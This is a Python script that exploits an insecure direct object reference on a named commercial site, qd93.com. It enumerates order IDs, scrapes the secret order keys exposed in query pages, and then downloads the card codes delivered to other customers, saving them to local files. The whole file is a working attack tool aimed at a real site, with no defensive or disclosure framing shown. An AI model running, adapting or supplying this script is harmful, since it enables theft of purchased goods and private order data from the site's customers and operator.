#!/usr/bin/env python3
"""qd93.com order IDOR export: mod=query&data={id} -> mod=faka id+skey."""
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://qd93.com/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
OUT_DIR = sys.argv[1] if len(sys.argv) > 1 else "/tmp/qd93_export"
MAX_ID = int(sys.argv[2]) if len(sys.argv) > 2 else 600

SHOW = re.compile(r"showOrder\((\d+),'([a-f0-9]{32})'")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def session():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    s.get(BASE, timeout=25)
    return s


def scan_id(s, oid):
    try:
        r = s.get(BASE, params={"mod": "query", "data": str(oid)}, timeout=15)
        pairs = {}
        for m in SHOW.finditer(r.text):
            pairs[m.group(1)] = m.group(2)
        for m in FAKA.finditer(r.text):
            pairs[m.group(1)] = m.group(2)
        return pairs
    except Exception:
        return {}


def fetch_card(s, oid, skey):
    try:
        r = s.get(
            BASE,
            params={"mod": "faka", "id": oid, "skey": skey},
            timeout=15,
        )
        if "非发卡类" in r.text or "alert" in r.text.lower() and "textarea" not in r.text:
            return {"id": oid, "skey": skey, "card": None, "skip": "non-faka"}
        m = CARD.search(r.text)
        if m:
            return {"id": oid, "skey": skey, "card": m.group(1).strip()}
        return {"id": oid, "skey": skey, "card": None, "skip": "no textarea"}
    except Exception as e:
        return {"id": oid, "skey": skey, "error": str(e)}


def main():
    import os

    os.makedirs(OUT_DIR, exist_ok=True)
    s = session()
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=12).json()
    max_id = int(gc.get("orders", MAX_ID)) + 20
    print("orders", gc.get("orders"), "scan_to", max_id)

    pairs = {}
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = {ex.submit(scan_id, s, i): i for i in range(1, max_id + 1)}
        for fut in as_completed(futs):
            pairs.update(fut.result())

    print("found pairs", len(pairs))

    cards = []
    for oid, skey in sorted(pairs.items(), key=lambda x: int(x[0])):
        row = fetch_card(s, oid, skey)
        cards.append(row)
        if row.get("card"):
            print(f"CARD {oid}: {row['card'][:100]}")

    card_lines = [c["card"] for c in cards if c.get("card")]
    with open(f"{OUT_DIR}/qd93_cards.txt", "w") as f:
        for line in card_lines:
            f.write(line + "\n")
    with open(f"{OUT_DIR}/qd93_orders.json", "w") as f:
        json.dump(
            {
                "target": "qd93.com",
                "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
                "getcount": gc,
                "pairs": len(pairs),
                "cards": len(card_lines),
                "orders": cards,
            },
            f,
            ensure_ascii=False,
            indent=2,
        )
    print("DONE cards", len(card_lines), "->", OUT_DIR)


if __name__ == "__main__":
    main()
